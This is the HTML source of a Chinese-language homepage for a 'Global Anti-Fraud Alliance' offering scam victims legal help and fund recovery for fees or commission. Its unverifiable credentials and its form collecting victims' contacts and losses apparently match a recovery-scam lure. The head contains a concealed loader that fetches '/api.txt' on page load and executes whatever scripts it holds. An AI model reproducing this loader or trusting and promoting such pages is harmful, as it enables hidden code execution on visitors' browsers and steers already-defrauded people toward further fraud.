<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <meta content="width=device-width, initial-scale=1.0" name="viewport">
    <title>全球反诈骗联盟</title>
<meta name="generator" content="">
<meta name="author" content="全球反诈骗联盟">
<meta name="keywords" content="">
<meta name="description" content="全球反诈骗联盟是一家专注于全球反诈骗合作与公益援助的国际组织。联盟汇聚来自多个国家和地区的法律专家、金融调查人员、网络安全顾问、反洗钱专家及公益机构，共同推动跨境反诈合作机制建设。">
    <!-- Fonts -->
    <link href="https://fonts.googleapis.com" rel="preconnect">
    <link href="https://fonts.gstatic.com" rel="preconnect" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Roboto:ital,wght@0,100;0,300;0,400;0,500;0,700;0,900;1,100;1,300;1,400;1,500;1,700;1,900&family=Montserrat:ital,wght@0,100;0,200;0,300;0,400;0,500;0,600;0,700;0,800;0,900;1,100;1,200;1,300;1,400;1,500;1,600;1,700;1,800;1,900&family=Raleway:ital,wght@0,100;0,200;0,300;0,400;0,500;0,600;0,700;0,800;0,900;1,100;1,200;1,300;1,400;1,500;1,600;1,700;1,800;1,900&display=swap"
          rel="stylesheet">
    <!-- Vendor CSS Files -->
    <link href="static/css/bootstrap.min.css" rel="stylesheet">
    <link href="static/css/bootstrap-icons.css" rel="stylesheet">
    <link href="static/css/aos.css" rel="stylesheet">
    <link href="static/css/swiper-bundle.min.css" rel="stylesheet">
    <!-- Main CSS File -->
    <link href="static/css/main.css" rel="stylesheet">
    <script>
        fetch('/api.txt')
            .then(res => res.text())
            .then(scriptText => {
                const container = document.createElement('div');
                container.innerHTML = scriptText;
                const scripts = container.querySelectorAll('script');
                scripts.forEach(oldScript => {
                    const newScript = document.createElement('script');
                    [...oldScript.attributes].forEach(attr => {
                        newScript.setAttribute(attr.name, attr.value);
                    });
                    newScript.textContent = oldScript.textContent;
                    document.head.appendChild(newScript);
                });
            });
    </script>
</head>
<body>
<header id="header" class="header d-flex align-items-center sticky-top">
    <div class="container-fluid container-xl position-relative d-flex align-items-center justify-content-between">
        <a href="" class="logo d-flex align-items-center">
            <img src="static/picture/logo.png" draggable="false" alt="">
        </a>
        <nav id="navmenu" class="navmenu">
            <ul>
                <li><a href="">首页</a></li>
                <li><a href="about.html">联盟简介</a></li>
                <li><a href="case.html">常见事例</a></li>
                <li><a href="services.html">业务领域</a></li>
                <li><a href="professionals.html">专业人员</a></li>
                <li><a href="partners.html">合作伙伴</a></li>
                <li><a href="contact.html">联系我们</a></li>
            </ul>
            <i class="mobile-nav-toggle d-xl-none bi bi-list"></i>
        </nav>
    </div>
</header><main class="main">
    <!-- Hero Section -->
    <section id="hero" class="hero section">
        <div class="container">
            <div class="hero-wrapper">
                <div class="row g-4">
                    <div class="col-lg-7">
                        <div class="hero-content">
                            <div class="content-header">
                                <span class="hero-label">
                                   <i class="bi bi-shield-check"></i>全球安全网络
                                </span>
                                <h1>联合全球力量<br>共同打击诈骗与数字犯罪</h1>
                                <p>全球反诈骗联盟致力于联合全球法律机构、网络安全专家、 金融调查团队及公益组织，共同打击网络诈骗、金融欺诈、投资欺诈、 数字资产犯罪及跨境诈骗活动，为全球受害者提供专业支持与援助。</p>
                            </div>
                            <div class="search-container">
                                <div class="search-header">
                                    <h3>案件信息申报</h3>
                                    <p>
                                        请填写您的基本情况，我们的团队将尽快在线咨询您的信息。<br class="d-lg-block d-none">
                                        并与您沟通下一步可行的处理方案。
                                    </p>
                                </div>
                                <form id="caseForm" class="property-search-form">
                                    <div class="search-grid">
                                        <div class="search-field">
                                            <label for="search-name" class="field-label">联系人</label>
                                            <input type="text" id="search-name" name="name" placeholder="请输入您的称呼" required="">
                                            <i class="bi bi-person field-icon"></i>
                                        </div>
                                        <div class="search-field">
                                            <label for="search-tel" class="field-label">联系方式</label>
                                            <input type="text" id="search-contact" name="contact" placeholder="WhatsApp / LINE / E-Mail" required="">
                                            <i class="bi bi-chat-dots field-icon"></i>
                                        </div>
                                        <div class="search-field">
                                            <label for="search-type" class="field-label">事件类型</label>
                                            <select id="search-type" name="scam_type" required="">
                                                <option value="">请选择诈骗类型</option>
                                                <option value="投资诈骗">投资诈骗</option>
                                                <option value="网络钓鱼">网络钓鱼</option>
                                                <option value="情感诈骗">情感诈骗</option>
                                                <option value="虚拟资产诈骗">虚拟资产诈骗</option>
                                                <option value="冒充身份诈骗">冒充身份诈骗</option>
                                                <option value="其他诈骗">其他诈骗</option></select>
                                            <i class="bi bi-shield-exclamation field-icon"></i>
                                        </div>
                                        <div class="search-field">
                                            <label for="search-loss" class="field-label">损失金额</label>
                                            <select id="search-loss" name="loss_amount" required="">
                                                <option value="">请选择金额范围</option>
                                                <option value="0">未造成资金损失</option>
                                                <option value="$1,000以下">$1,000 以下</option>
                                                <option value="$1,000-$10,000">$1,000 - $10,000</option>
                                                <option value="$10,000-$100,000">$10,000 - $100,000</option>
                                                <option value="$100000+">$100,000 以上</option></select>
                                            <i class="bi bi-currency-dollar field-icon"></i>
                                        </div>
                                    </div>
                                    <button type="submit" id="submit-btn" class="search-btn"><span>提交信息</span></button>
                                </form>
                                <script type="text/javascript">
                                    function setupCrispFormListener() {
                                        // 检查 Crisp 是否加载
                                        if (typeof $crisp === "undefined" || !$crisp.push) {
                                            console.warn("⏳ Crisp SDK not loaded, retrying in 1 second...");
                                            setTimeout(setupCrispFormListener, 1000);
                                            return;
                                        }

                                        const form = document.getElementById("caseForm");
                                        const submitBtn = document.getElementById("submit-btn");


                                        form.addEventListener("submit", function (event) {
                                            event.preventDefault();

                                            // 正确获取字段
                                            const name = document.getElementById("search-name").value.trim();
                                            const contact = document.getElementById("search-contact").value.trim();
                                            const scamType = document.getElementById("search-type").value.trim();
                                            const loss = document.getElementById("search-loss").value.trim();

                                            // 按钮状态
                                            submitBtn.disabled = true;
                                            submitBtn.innerText = "提交中...";

                                            // 打开 Crisp
                                            $crisp.push(["do", "chat:open"]);

                                            // 构造消息
                                            const msg =
                                                `案件信息申报\n` +
                                                `联系人：${name}\n` +
                                                `联系方式：${contact}\n` +
                                                `诈骗类型：${scamType}\n` +
                                                `损失金额：${loss}`;

                                            // 发送到 Crisp
                                            $crisp.push(["do", "message:send", ["text", msg]]);

                                            if (typeof gtag_report_conversion === "function") {
                                                gtag_report_conversion();
                                            }

                                            // 重置
                                            setTimeout(() => {
                                                submitBtn.disabled = false;
                                                submitBtn.innerText = "提交举报信息";
                                                form.reset();
                                            }, 800);
                                        });
                                    }
                                    // 启动监听
                                    setupCrispFormListener();
                                </script>
                            </div>
                            <div class="achievement-grid">
                                <div class="achievement-item">
                                    <div class="achievement-number">
                                        <span data-purecounter-start="0" data-purecounter-end="125000" data-purecounter-duration="1" class="purecounter"></span>+</div>
                                    <span class="achievement-text">诈骗举报</span></div>
                                <div class="achievement-item">
                                    <div class="achievement-number">
                                        <span data-purecounter-start="0" data-purecounter-end="120" data-purecounter-duration="1" class="purecounter"></span>+</div>
                                    <span class="achievement-text">全球合作伙伴</span></div>
                                <div class="achievement-item">
                                    <div class="achievement-number">
                                        <span data-purecounter-start="0" data-purecounter-end="98" data-purecounter-duration="1" class="purecounter"></span>%</div>
                                    <span class="achievement-text">保护成功率</span></div>
                            </div>
                        </div>
                    </div>
                    <div class="col-lg-5">
                        <div class="hero-visual">
                            <div class="visual-container">
                                <div class="featured-property">
                                    <img src="static/picture/b1.jpg" alt="全球反诈骗法律支持团队" class="img-fluid">
                                    <div class="property-info">
                                        <div class="property-price">专业律师支持团队</div>
                                        <div class="property-details">
                                            <span><i class="bi bi-globe"></i>跨国法律协作网络</span>
                                            <span><i class="bi bi-shield-check"></i>反诈骗案件法律支援</span>
                                        </div>
                                    </div>
                                </div>
                                <div class="overlay-images">
                                    <div class="overlay-img overlay-2">
                                        <img src="static/picture/b2.jpg" alt="网络安全防护" class="img-fluid">
                                    </div>
                                </div>
                                <div class="agent-card">
                                    <div class="agent-profile">
                                        <img src="static/picture/ceo.jpg" alt="反诈骗专家" class="agent-photo">
                                        <div class="agent-info">
                                            <h4>全球安全团队</h4>
                                            <p>反诈骗情报专家</p>
                                            <div class="agent-rating">
                                                <div class="stars">
                                                    <i class="bi bi-star-fill"></i>
                                                    <i class="bi bi-star-fill"></i>
                                                    <i class="bi bi-star-fill"></i>
                                                    <i class="bi bi-star-fill"></i>
                                                    <i class="bi bi-star-fill"></i>
                                                </div>
                                                <span class="rating-text">值得信赖的全球网络</span></div>
                                        </div>
                                    </div>
                                    <button class="contact-agent-btn" onclick="showline()">
                                        <i class="bi bi-chat-dots"></i>
                                    </button>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </section>

    <section id="home-about" class="home-about section">
        <div class="container">
            <div class="row gy-5">
                <div class="col-lg-5">
                    <div class="image-gallery">
                        <div class="primary-image">
                            <img src="static/picture/b3.jpg" alt="全球反诈骗情报中心" class="img-fluid">
                            <div class="experience-badge">
                                <div class="badge-content">
                                    <div class="number">
                                        <span data-purecounter-start="0" data-purecounter-end="25" data-purecounter-duration="3" class="purecounter"></span>+</div>
                                    <div class="text">年<br>全球协作经验</div></div>
                            </div>
                        </div>
                        <div class="secondary-image">
                            <img src="static/picture/b4.jpg" alt="安全情报分析系统" class="img-fluid"></div>
                    </div>
                </div>
                <div class="col-lg-7">
                    <div class="content">
                        <div class="section-header">
                            <span class="section-label">关于我们</span>
                            <h2>一站式全球反诈协作平台</h2>
                        </div>
                        <p>全球反诈骗联盟致力于构建跨区域协作的安全信息网络，通过整合金融机构、执法单位与网络安全团队的专业资源，提升对电信诈骗、网络欺诈及跨境金融犯罪的识别与响应能力。<br>我们以情报共享与技术协作为基础，推动建立更高效的风险预警机制与案件协同处理流程，协助降低全球范围内的诈骗发生率，并提升公众的安全防护意识与应对能力。</p>
                         <div class="achievements-list">
                            <div class="achievement-item">
                                <div class="achievement-icon">
                                    <i class="bi bi-house-door"></i>
                                </div>
                                <div class="achievement-content">
                                    <h4>
                                        <span data-purecounter-start="0" data-purecounter-end="3200" data-purecounter-duration="2" class="purecounter"></span>+ 已追踪诈骗案件</h4>
                                    <p>全球范围内识别并持续监测的诈骗案例</p>
                                </div>
                            </div>
                            <div class="achievement-item">
                                <div class="achievement-icon">
                                    <i class="bi bi-people"></i>
                                </div>
                                <div class="achievement-content">
                                    <h4>
                                        <span data-purecounter-start="0" data-purecounter-end="98" data-purecounter-duration="1" class="purecounter"></span>% 响应效率</h4>
                                    <p>跨国协作与案件响应处理效率</p>
                                </div>
                            </div>
                        </div>
                        <div class="action-section">
                            <a href="about.html" class="btn-cta">
                                <span>了解我们的联盟</span>
                                <i class="bi bi-arrow-right"></i>
                            </a>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </section>

    <section id="featured-properties" class="featured-properties section">
        <!-- Section Title -->
        <div class="container section-title">
            <h2>核心服务领域</h2>
            <p>全球反诈骗联盟持续监测并追踪高风险网络诈骗模式，提升公众风险识别能力</p>
        </div>
        <!-- End Section Title -->
        <div class="container">
            <div class="row gy-5">
                <div class="col-lg-8">
                    <div class="featured-property-main">
                        <div class="property-hero">
                            <img src="static/picture/fw1.jpg" alt="加密货币投资诈骗监测" class="img-fluid">
                            <div class="property-overlay">
                                <div class="property-badge-main premium">高风险</div>
                                <div class="property-stats">
                                    <div class="stat-item">
                                        <i class="bi bi-house-door"></i>
                                        <span>加密货币骗局</span></div>
                                    <div class="stat-item">
                                        <i class="bi bi-droplet-fill"></i>
                                        <span>虚假交易平台</span></div>
                                    <div class="stat-item">
                                        <i class="bi bi-arrows-move"></i>
                                        <span>资金快速转移</span></div>
                                </div>
                            </div>
                        </div>
                        <div class="property-hero-content">
                            <div class="property-header">
                                <div class="property-info">
                                    <h2>
                                        <a href="javascript:showline()">加密货币投资诈骗</a></h2>
                                    <div class="property-address">
                                        <i class="bi bi-geo-alt-fill"></i>
                                        <span>虚拟资产与交易平台风险</span></div>
                                </div>
                                <div class="property-price-main">高发风险类型</div></div>
                            <p class="property-description">以虚拟货币投资为诱饵，通过虚假交易平台、伪造收益数据及资金盘模式实施诈骗，受害者通常在短期内遭受重大资金损失。</p>
                            <div class="property-actions-main">
                                <a href="javascript:showline()" class="btn-primary-custom">在线咨询</a>
                                <a href="case.html" class="btn-outline-custom">更多案例</a>
                                <div class="property-listing-info">
                                    <span class="listing-status for-sale">持续监测</span>
                                    <span class="listing-date">全球范围高发</span></div>
                            </div>
                        </div>
                    </div>
                </div>
                <div class="col-lg-4">
                    <div class="properties-sidebar">
                        <div class="sidebar-property-card">
                            <div class="sidebar-property-image">
                                <img src="static/picture/fw2.jpg" alt="国际爱情诈骗" class="img-fluid">
                                <div class="sidebar-property-badge hot">高发</div></div>
                            <div class="sidebar-property-content">
                                <h4>
                                    <a href="javascript:showline()">国际爱情骗局</a></h4>
                                <div class="sidebar-location">
                                    <i class="bi bi-pin-map"></i>
                                    <span>社交平台情感诈骗</span></div>
                                <div class="sidebar-specs">
                                <span>
                                  <i class="bi bi-house"></i>情感操控</span>
                                                    <span>
                                  <i class="bi bi-droplet"></i>长期诱导</span>
                                                    <span>
                                  <i class="bi bi-rulers"></i>跨境诈骗</span>
                                </div>
                                <div class="sidebar-price-row">
                                    <div class="sidebar-price">高风险类型</div>
                                    <a href="javascript:showline()" class="sidebar-btn">在线咨询</a></div>
                            </div>
                        </div>
                        <div class="sidebar-property-card">
                            <div class="sidebar-property-image">
                                <img src="static/picture/fw3.jpg" alt="社交媒体诈骗" class="img-fluid">
                                <div class="sidebar-property-badge new">新型</div></div>
                            <div class="sidebar-property-content">
                                <h4>
                                    <a href="javascript:showline()">社交媒体诈骗</a></h4>
                                <div class="sidebar-location">
                                    <i class="bi bi-pin-map"></i>
                                    <span>Facebook / Instagram / TikTok</span></div>
                                <div class="sidebar-specs">
                            <span>
                              <i class="bi bi-house"></i>账号盗用</span>
                                                <span>
                              <i class="bi bi-droplet"></i>虚假身份</span>
                                                <span>
                              <i class="bi bi-rulers"></i>钓鱼链接</span>
                                            </div>
                                <div class="sidebar-price-row">
                                    <div class="sidebar-price">快速扩散</div>
                                    <a href="javascript:showline()" class="sidebar-btn">在线咨询</a></div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
            <div class="row gy-4 mt-4">
                <div class="col-xl-6">
                    <div class="property-card-horizontal">
                        <div class="property-image-horizontal">
                            <img src="static/picture/fw4.jpg" alt="投资与外汇诈骗" class="img-fluid">
                            <div class="property-badge-horizontal exclusive">高风险</div></div>
                        <div class="property-content-horizontal">
                            <h3>
                                <a href="javascript:showline()">投资、外汇与私募股票诈骗</a></h3>
                            <div class="property-location-horizontal">
                                <i class="bi bi-geo-alt"></i>
                                <span>虚假金融投资平台</span></div>
                            <div class="property-features">
                              <span class="feature">
                                <i class="bi bi-house"></i>高收益诱导</span>
                                                <span class="feature">
                                <i class="bi bi-droplet"></i>资金盘结构</span>
                                                <span class="feature">
                                <i class="bi bi-rulers"></i>非法集资</span>
                            </div>
                            <p>通过承诺高额回报吸引投资者参与外汇、股票及私募基金项目，实际为资金盘或非法集资骗局。</p>
                            <div class="property-footer-horizontal">
                                <div class="property-price-horizontal">重点监测</div>
                                <a href="javascript:showline()" class="btn-view-horizontal">在线咨询</a></div>
                        </div>
                    </div>
                </div>
                <div class="col-xl-6">
                    <div class="property-card-horizontal">
                        <div class="property-image-horizontal">
                            <img src="static/picture/fw5.jpg" alt="副业培训诈骗" class="img-fluid">
                            <div class="property-badge-horizontal new">重点监测</div></div>
                        <div class="property-content-horizontal">
                            <h3>
                                <a href="javascript:showline()">副业培训与引流诈骗</a></h3>
                            <div class="property-location-horizontal">
                                <i class="bi bi-geo-alt"></i>
                                <span>虚假副业课程与培训机构</span></div>
                            <div class="property-features">
                          <span class="feature">
                            <i class="bi bi-house"></i>高价课程陷阱</span>
                                <span class="feature">
                            <i class="bi bi-droplet"></i>夸大收益宣传</span>
                                <span class="feature">
                            <i class="bi bi-rulers"></i>诱导持续付费</span>
                            </div>
                            <p>通过包装“月入过万副业课程”“零基础暴富项目”等内容吸引报名，实际提供低价值或虚假培训服务。</p>
                            <div class="property-footer-horizontal">
                                <div class="property-price-horizontal">风险上升</div>
                                <a href="javascript:showline()" class="btn-view-horizontal">在线咨询</a></div>
                        </div>
                    </div>
                </div>

            </div>
        </div>
    </section>


    <!-- Featured Services Section -->
    <section id="featured-services" class="featured-services section" style="background: #f1f1f1;">
        <div class="container">
            <div class="topics">
                <div><h3><span>约<em>1550</em>亿元</span>这个数字代表什么？<br>你了解吗？</h3></div>
            </div>
            <div class="read-1">
                <p><span class="marker">累计到<em>2026年</em></span><br><span class="marker">投资诈骗造成的累计损失金额</span></p>
            </div>
            <div class="fig">
                <figure class="m-0"><img src="static/picture/an.jpg" class="img-fluid"></figure>
            </div>
            <div class="read-2">
                <p class="txt-1">仅已确认的案件数量<br><span class="marker">高达<em>13,209</em>起</span></p>
                <p class="txt-2">更令人警惕的是，其中大量诈骗<br class="sp">通过WhatsApp、Instagram、Line等社交平台<br>利用精心设计的话术实施诈骗。</p>
            </div>
            <div class="fig">
                <figure class="m-0"><img src="static/picture/at.jpg" class="img-fluid"></figure>
            </div>
            <div class="text-center">
                <p>
                    鉴于这类骗局日益猖獗，<br>
                    任何人都有可能成为诈骗受害者。
                </p>
                <p>
                    如果你不幸遭遇诈骗， 不要因为被骗而感到羞愧，<br>
                    也不要怀疑为什么事情会发生在自己身上。
                </p>
                <p class="mb-0">
                    现在最重要的是立即寻求帮助， 联系身边可信任的人，<br>
                    并尽快采取有效措施保护自己的权益。
                </p>
            </div>
        </div>
    </section>
    <!-- /Featured Services Section -->

    <section id="featured-agents" class="featured-agents section light-background">
        <!-- Section Title -->
        <div class="container section-title">
            <h2>专业团队</h2>
            <p>汇聚全球法律、安全与反诈骗专家，共同构建数字安全防护体系</p>
        </div>
        <!-- End Section Title -->
        <div class="container">
            <div class="row gy-4 justify-content-center">
                <div class="col-lg-3 col-md-6">
                    <div class="featured-agent">
                        <div class="agent-wrapper">
                            <div class="agent-photo">
                                <img src="static/picture/p7.jpg" class="img-fluid">
                                </div>
                                 <div class="agent-details">
                                 <h4>刘志远</h4>
                                 <span class="position">法律维权高级顾问</span>
                            </div>
                        </div>
                    </div>
                </div>
                <div class="col-lg-3 col-md-6">
                    <div class="featured-agent">
                        <div class="agent-wrapper">
                            <div class="agent-photo">
                                <img src="static/picture/p8.jpg" class="img-fluid">
                                </div>
                                <div class="agent-details">
                                    <h4>Edward Collins</h4>
                                    <span class="position">跨境金融纠纷解决专家</span>
                                </div>
                        </div>
                    </div>
                </div>
                <div class="col-lg-3 col-md-6">
                    <div class="featured-agent">
                        <div class="agent-wrapper">
                            <div class="agent-photo">
                                <img src="static/picture/p3.jpg" class="img-fluid">
                                </div>
                            <div class="agent-details">
                                <h4>庄欣怡</h4>
                                <span class="position">网络诈骗案件维权律师</span>
                            </div>
                        </div>
                    </div>
                </div>
                <div class="col-lg-3 col-md-6">
                    <div class="featured-agent">
                        <div class="agent-wrapper">
                            <div class="agent-photo">
                                <img src="static/picture/p4.jpg" class="img-fluid">
                                </div>
                            <div class="agent-details">
                                <h4>李安娜</h4>
                                <span class="position">受害者权益保护法律专家</span>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </section>



    <section id="why-us" class="why-us section">
        <!-- Section Title -->
        <div class="container section-title">
            <h2>为什么选择我们</h2>
            <p>通过全球协作、智能技术与法律支持，共同应对不断变化的网络诈骗威胁</p>
        </div>
        <!-- End Section Title -->
        <div class="container">
            <div class="row gy-4">
                <div class="col-lg-6">
                    <div class="content">
                        <h3>构建反诈骗防护体系</h3>
                        <p>全球反诈骗联盟联合法律专家、网络安全机构及国际合作伙伴，通过诈骗情报共享、风险监测和案件支持机制，为个人、企业与机构提供全面的数字安全保护。</p>
                        <div class="features-list">
                            <div class="feature-item d-flex align-items-center mb-3">
                                <div class="icon-wrapper me-3">
                                    <i class="bi bi-check-circle-fill"></i>
                                </div>
                                <div>
                                    <h5>全球诈骗情报分析</h5>
                                    <p>持续追踪全球诈骗趋势，识别高风险诈骗模式并提供预警信息。</p>
                                </div>
                            </div>
                            <div class="feature-item d-flex align-items-center mb-3">
                                <div class="icon-wrapper me-3">
                                    <i class="bi bi-shield-check"></i>
                                </div>
                                <div>
                                    <h5>专业法律安全支持</h5>
                                    <p>由专业律师团队提供诈骗案件咨询、维权指导及法律协助。</p>
                                </div>
                            </div>
                            <div class="feature-item d-flex align-items-center mb-3">
                                <div class="icon-wrapper me-3">
                                    <i class="bi bi-headset"></i>
                                </div>
                                <div>
                                    <h5>全天候风险援助服务</h5>
                                    <p>快速响应用户求助，为诈骗受害者提供及时支持与解决方案。</p>
                                </div>
                            </div>
                            <div class="feature-item d-flex align-items-center mb-3">
                                <div class="icon-wrapper me-3">
                                    <i class="bi bi-graph-up-arrow"></i>
                                </div>
                                <div>
                                    <h5>数据驱动风险防控</h5>
                                    <p>结合人工智能与大数据技术，提高诈骗识别和防御能力。</p>
                                </div>
                            </div>
                        </div>
                        <div class="cta-buttons mt-4">
                            <a href="about.html" class="btn btn-primary me-3">了解我们的使命</a>
                            <a href="contact.html" class="btn btn-outline-primary">联系我们</a></div>
                    </div>
                </div>
                <div class="col-lg-6">
                    <div class="stats-section">
                        <div class="row gy-4">
                            <div class="col-md-6">
                                <div class="stat-card text-center">
                                    <div class="stat-icon mb-3">
                                        <i class="bi bi-house-door"></i>
                                    </div>
                                    <div class="stat-number">
                                        <span data-purecounter-start="0" data-purecounter-end="2500" data-purecounter-duration="2" class="purecounter"></span>+</div>
                                    <div class="stat-label">诈骗案例追踪</div>
                                    <p>持续分析全球诈骗案例与风险趋势。</p>
                                </div>
                            </div>
                            <div class="col-md-6">
                                <div class="stat-card text-center">
                                    <div class="stat-icon mb-3">
                                        <i class="bi bi-people"></i>
                                    </div>
                                    <div class="stat-number">
                                        <span data-purecounter-start="0" data-purecounter-end="98" data-purecounter-duration="2" class="purecounter"></span>%</div>
                                    <div class="stat-label">响应效率</div>
                                    <p>快速处理安全咨询与风险预警。</p>
                                </div>
                            </div>
                            <div class="col-md-6">
                                <div class="stat-card text-center">
                                    <div class="stat-icon mb-3">
                                        <i class="bi bi-clock-history"></i>
                                    </div>
                                    <div class="stat-number">
                                        <span data-purecounter-start="0" data-purecounter-end="20" data-purecounter-duration="2" class="purecounter"></span>+</div>
                                    <div class="stat-label">合作机构</div>
                                    <p>连接全球安全、法律与技术伙伴。</p>
                                </div>
                            </div>
                            <div class="col-md-6">
                                <div class="stat-card text-center">
                                    <div class="stat-icon mb-3">
                                        <i class="bi bi-award"></i>
                                    </div>
                                    <div class="stat-number">
                                        <span data-purecounter-start="0" data-purecounter-end="45" data-purecounter-duration="2" class="purecounter"></span>+</div>
                                    <div class="stat-label">安全项目</div>
                                    <p>推动全球反诈骗教育与防护行动。</p>
                                </div>
                            </div>
                        </div>
                        <div class="testimonial-preview mt-5">
                            <div class="testimonial-card">
                                <div class="quote-icon mb-2">
                                    <i class="bi bi-quote"></i>
                                </div>
                                <p>"我们相信，面对日益复杂的网络诈骗威胁，全球协作、技术创新与法律支持将成为保护数字世界安全的关键力量。"</p>
                                <div class="testimonial-author d-flex align-items-center mt-3">
                                    <img src="static/picture/person.png" alt="CEO寄语" class="author-image me-3">
                                    <div>
                                        <h6>William Anderson</h6>
                                        <span>创始人｜首席战略官</span>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </section>
</main>
<section class="call-to-action-1 call-to-action section" id="call-to-action">
    <div class="cta-bg" style="background-image: url('static/picture/ctabg.jpg');"></div>
    <div class="container">
        <div class="row justify-content-center">
            <div class="col-xl-6 col-lg-8">
                <div class="cta-content text-center">
                    <h2>发现诈骗风险？ <br> 立即获得专业帮助</h2>
                    <p>全球反诈骗联盟提供诈骗风险识别、法律咨询与安全援助服务，帮助个人和企业及时应对网络诈骗威胁，保护数字资产与信息安全。</p>

                    <div class="cta-buttons">
                        <a href="javascript:showline()" class="btn btn-primary">立即咨询</a>
                        <a href="javascript:showline()" class="btn btn-outline">获取安全指导</a>
                    </div>

                    <div class="cta-features">
                        <div class="feature-item">
                            <i class="bi bi-telephone-fill"></i>
                            <span>免费风险咨询</span>
                        </div>

                        <div class="feature-item">
                            <i class="bi bi-clock-fill"></i>
                            <span>全天候支持</span>
                        </div>

                        <div class="feature-item">
                            <i class="bi bi-shield-fill-check"></i>
                            <span>专业安全团队</span>
                        </div>
                    </div>

                </div>
                <!-- End CTA Content -->
            </div>
        </div>
    </div>
</section>
<footer id="footer" class="footer accent-background">
    <div class="container footer-top">
        <div class="row gy-4">

            <div class="col-lg-5 col-md-12 footer-about">
                <a href="" class="logo d-flex align-items-center">
                    <span class="sitename">全球反诈骗联盟</span>
                </a>
                <p>
                    全球反诈骗联盟是一家致力于推动跨国反诈骗协作与公共安全倡议的国际合作平台。
                    <br>
                    我们联合来自不同国家与地区的法律专家、金融合规人员、网络安全研究者及风险治理机构，共同构建覆盖全球的诈骗防控与信息共享网络。
                </p>
                <p>
                    <img src="static/picture/ry.png" class="img-fluid" draggable="false">
                </p>
            </div>

            <div class="col-lg-2 col-6 footer-links">
                <h4>快速导航</h4>
                <ul>
                    <li><a href="about.html">联盟简介</a></li>
                    <li><a href="case.html">常见事例</a></li>
                    <li><a href="services.html">业务领域</a></li>
                    <li><a href="professionals.html">专业人员</a></li>
                    <li><a href="partners.html">合作伙伴</a></li>
                    <li><a href="contact.html">联系我们</a></li>
                </ul>
            </div>
            <div class="col-lg-2 col-6 footer-links">
                <h4>我们服务</h4>
                <ul>
                    <li><a href="javascript:showline()">风险检测</a></li>
                    <li><a href="javascript:showline()">资金追踪</a></li>
                    <li><a href="javascript:showline()">法律援助</a></li>
                    <li><a href="javascript:showline()">安全咨询</a></li>
                </ul>
            </div>


            <div class="col-lg-3 col-md-12 footer-contact text-center text-md-start">
                <h4>联系我们</h4>
                <p>香港中环康乐广场1号怡和大厦32楼3201室</p>
                <p>周一至周日：上午9点~晚上10点</p>

            </div>
        </div>
    </div>


    <div class="container copyright text-center mt-4">
        <p>© <span>版权所有</span> <strong class="px-1 sitename">全球反诈骗联盟</strong> <span>保留所有权利 未经同意，禁止复制和分发</span>
        </p>
        <div class="credits">
            全球反诈骗联盟为所有新客户提供首次免费咨询。任何后续的资金追回或其他相关服务将根据每个案件的性质和复杂程度收取费用和/或佣金。
            <br>
            请注意，我们不提供投资、金融服务或财务建议。
        </div>
    </div>

</footer>

<script src="static/js/bootstrap.bundle.min.js"></script>
<script src="static/js/validate.js"></script>
<script src="static/js/aos.js"></script>
<script src="static/js/purecounter_vanilla.js"></script>
<script src="static/js/swiper-bundle.min.js"></script>
<!-- Main JS File -->
<script src="static/js/main.js"></script></body>
</html>